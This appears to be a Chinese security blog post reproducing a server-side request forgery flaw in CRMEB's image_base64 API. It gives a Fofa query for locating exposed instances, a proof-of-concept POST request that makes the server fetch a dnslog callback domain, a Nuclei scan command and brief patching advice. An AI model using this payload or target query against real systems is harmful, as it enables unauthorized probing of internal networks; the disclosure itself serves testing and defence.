#  漏洞复现｜CRMEB image_base64存在SSRF漏洞  
 Poc复现   2026-10-15 01:30  
  
   
  
# 免责声明  
> 「此公众号所分享的网络安全知识、信息及工具皆来源互联网公开收集整理，仅供学习和研究使用，请勿用于非法测试活动。由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，产生的一切后果由读者自行承担，皆与本公众号及文章作者无关、不负任何责任！！！」「如有内容侵权，请联系我们删除处理。谢谢合作！！！」  
  
# 漏洞概述  
> CRMEB image_base64存在SSRF漏洞，被未授权的攻击者利用漏洞构造包含恶意指令的特殊请求探测服务器内网，严重导致服务器被控。  
  
# 影响范围  
> CRMEB  
  
# 空间测绘  
### Fofa  
```
body="/wap/first/zsff/iconfont/iconfont.css" || body="CRMEB"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsSczk7pEmamC80xqwxxlBlRWT89WnTtbp0aiazArL0AUHVWD19CnSBsz3xpMibTZyBmibTwZhpvJKSXLpoCvSI6kOGnmgrBVzZpCjHo/640?wx_fmt=png&from=appmsg "")  
# 漏洞复现  
#### Poc  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Qvo4lzibsSczfbZ0jqzvH7dfFzFSW6Zjx2rYslutdF20n4BJQXqIzZ92dumRhWes50rRK7sB56PweOCwibibWJyPksFkiarpOEyxwsmAYVibwmcE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qvo4lzibsScw2McB2oJqke99z3DzictXvGJST1ib2wkJx3Mficl18cuZ1icLdkIahLxNHAmY1LRNbK0DjZCnwnTkN7zgjItwvbFCstMs6oVfc7oE/640?wx_fmt=png&from=appmsg "")  
```
POST /api/image_base64 HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedimage=http://ly900s.dnslog.cn&code=
```  
# 漏洞自查  
#### Nuclei  
```
nuclei.exe -u 目标URL -stats -silent -t crmeb-image-base64-ssrf.yaml  
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Qvo4lzibsScyh5NqQn3KQuc5dVJr9gIOEp5IrwHu3ttW2bzkuP70nbeR6koV7Yv48Xiam0Fia2dQtPwEBrtciajUpkOyFwibXicSBhVcYhsaW5buw/640?wx_fmt=png&from=appmsg "")  
# 修复建议  
> • 建议联系厂商打补丁或升级版本。• 增加Web应用防火墙防护。  
  
### poc免费获取  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Qvo4lzibsScwjtdiaHoO52jCcK1XZKhosJOvrzKxszBSEVJPEicLWkZYF1COaDbtYP5JM1xPKichjQaXe1sXCJZKeyaNyaGx0wk31sGe3j6Gw04/640?wx_fmt=jpeg&from=appmsg "")  
  
  
   
  
  
